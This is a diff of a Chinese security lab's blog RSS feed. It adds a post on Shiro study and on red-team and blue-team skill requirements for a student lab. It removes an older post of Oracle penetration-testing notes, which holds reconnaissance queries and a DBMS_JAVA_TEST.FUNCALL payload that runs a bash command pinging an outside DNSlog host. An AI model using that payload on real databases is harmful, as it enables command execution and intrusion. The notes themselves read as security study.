@@ -6,9 +6,61 @@
     <description>哨兵安全实验室</description>
     <link>https://www.sentrylab.cn/</link>
     <atom:link href="https://sentrylab.cn/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 18 Feb 2021 10:07:58 +0800</pubDate>
-    <lastBuildDate>Thu, 18 Feb 2021 10:07:58 +0800</lastBuildDate>
+    <pubDate>Sat, 13 Mar 2021 00:56:06 +0800</pubDate>
+    <lastBuildDate>Sat, 13 Mar 2021 00:56:06 +0800</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>blog: 辛丑·本命年 年后的一些思考</title>
+        <description>&lt;p&gt;过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;一切正在有条不紊的进行着：&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;说些没用的：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;网安实验室队伍安排：
+    &lt;ul&gt;
+      &lt;li&gt;导师：
+  队伍灵魂；&lt;/li&gt;
+      &lt;li&gt;我的角色：
+  我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。&lt;/li&gt;
+      &lt;li&gt;攻击队伍（红队）要求：
+        &lt;ul&gt;
+          &lt;li&gt;1.熟悉各种漏洞特征和利用原理；&lt;/li&gt;
+          &lt;li&gt;2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；&lt;/li&gt;
+          &lt;li&gt;3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;防守队伍（蓝队）要求：
+        &lt;ul&gt;
+          &lt;li&gt;1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；&lt;/li&gt;
+          &lt;li&gt;2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；&lt;/li&gt;
+          &lt;li&gt;3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;数据挖掘类，涉及到算法应用等；不多说。&lt;/li&gt;
+      &lt;li&gt;开发类；不多说。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+        <link> https://www.sentrylab.cn/blog/2021/thereis-something2say/</link>
+        <guid isPermaLink="true">/blog/2021/thereis-something2say/</guid>
+        
+        
+        <category>blog</category>
+        
+        <category>笔记</category>
+        
+      </item>
     
       <item>
         <title>event: 更新于2021/02/09-「置顶文章速览」</title>
@@ -201,97 +253,6 @@ if($link-&amp;gt;FetchArray($link-&amp;gt;query(&quot;SELECT * FROM User WHERE `
         <category>blog</category>
         
         <category>php</category>
-        
-        <category>笔记</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: 随笔记：Oracle数据库的渗透测试</title>
-        <description>&lt;p&gt;使用docker进行oracle数据库渗透测试，环境如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/b30021a421b8&quot;&gt;docker启动oracle&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;参考链接：&lt;a href=&quot;https://www.freebuf.com/articles/web/5411.html&quot;&gt;Oracle爆错手工注入&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;渗透常用语句：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;
-1 当前用户权限 
-select * from session_roles
-2 当前数据库版本 
-select banner from sys.v_$version where rownum=1
-3 服务器出口IP 
-用utl_http.request 可以实现
-4 服务器监听IP d
-select utl_inaddr.get_host_address from dual
-5 服务器操作系统
-select member from v$logfile where rownum=1
-6 服务器sid查询，远程连接的话需要
-select instance_name fromv$instance;
-7 当前连接用户
-select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;版本：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from v&lt;span class=&quot;nv&quot;&gt;$version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production
-PL/SQL Release 11.2.0.4.0 - Production
-CORE	11.2.0.4.0	Production
-TNS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 11.2.0.4.0 - Production
-NLSRTL Version 11.2.0.4.0 - Production
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;oracleShell.jar环境&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - Production
-PL/SQL Release 11.2.0.1.0 - Production
-&lt;span class=&quot;s2&quot;&gt;&quot;CORE	11.2.0.1.0	Production&quot;&lt;/span&gt;
-TNS &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;32-bit Windows: Version 11.2.0.1.0 - Production
-NLSRTL Version 11.2.0.1.0 - Production
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;select utl_inaddr.get_host_address from dual&lt;/p&gt;
-
-&lt;p&gt;172.17.0.2&lt;/p&gt;
-
-&lt;p&gt;补丁：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from dba_registry_history&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-
-2018-04-25 12:22:17.105985	APPLY	SERVER	11.2.0.4	0	PSU	Patchset 11.2.0.2.0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;权限：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from session_roles&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-CONNECT
-RESOURCE
-DBA
-SELECT_CATALOG_ROLE
-HS_ADMIN_SELECT_ROLE
-EXECUTE_CATALOG_ROLE
-HS_ADMIN_EXECUTE_ROLE
-DELETE_CATALOG_ROLE
-EXP_FULL_DATABASE
-IMP_FULL_DATABASE
-DATAPUMP_EXP_FULL_DATABASE
-DATAPUMP_IMP_FULL_DATABASE
-GATHER_SYSTEM_STATISTICS
-SCHEDULER_ADMIN
-WM_ADMIN_ROLE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Select DBMS_JAVA_TEST.FUNCALL&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'oracle/aurora/util/Wrapper'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'main'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'/bin/bash'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'-c'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'ping ojuht0.dnslog.cn'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from dual&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Thu, 29 Oct 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/Oracle-sql/</link>
-        <guid isPermaLink="true">/blog/2020/Oracle-sql/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>Sql-Inject</category>
         
         <category>笔记</category>
         
